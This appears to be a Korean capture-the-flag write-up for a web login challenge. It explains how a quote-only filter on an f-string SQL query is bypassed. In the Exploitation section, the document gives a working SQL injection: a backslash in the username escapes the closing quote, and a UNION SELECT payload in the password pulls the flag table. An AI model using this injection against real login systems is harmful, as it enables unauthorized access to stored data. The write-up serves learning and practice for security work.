# Category

web

# Overview

A simple login service :)

# Analysis

- `POST /login`에서 `username`과 `password`를 입력받아 f-string sql문에 대입하여 사용자 정보를 조회하는 코드가 존재하며 사용자의 입력을 `'`를 통해 필터링한다.

- `/db/init.sql`에서 flag는 `flag` 테이블의 `value`컬럼에 저장된 것을 알 수 있다.

# Exploitation

- `username`을 `\`로 전달하게되면 `'{username}'`의 뒷 `'`는 문자열 `'`처럼 인식하게 되다.

  이를 통해 문자열의 범위가 `'{password}'`의 앞부분 `'`까지로 변경된다.

  ```sql
  SELECT *
  FROM users
  WHERE username = '\' AND password = '{password}'
  ```

- `password`를 `UNION` 쿼리를 통해 쿼리의 결과를 합쳐 `flag`를 조회했다.

  `users`와 `flag` 테이블의 컬럼의 개수가 다르기 때문에 `null`을 통해 맞춰줬다.

  뒤에 남은 부분을 `#` 주석으로 처리했다.

  ```sql
  SELECT *
  FROM users
  WHERE username = '\' AND password = 'UNION SELECT value, null FROM flag # {password}'
  ```

# Flag

`Alpaca{SQ...s!}`
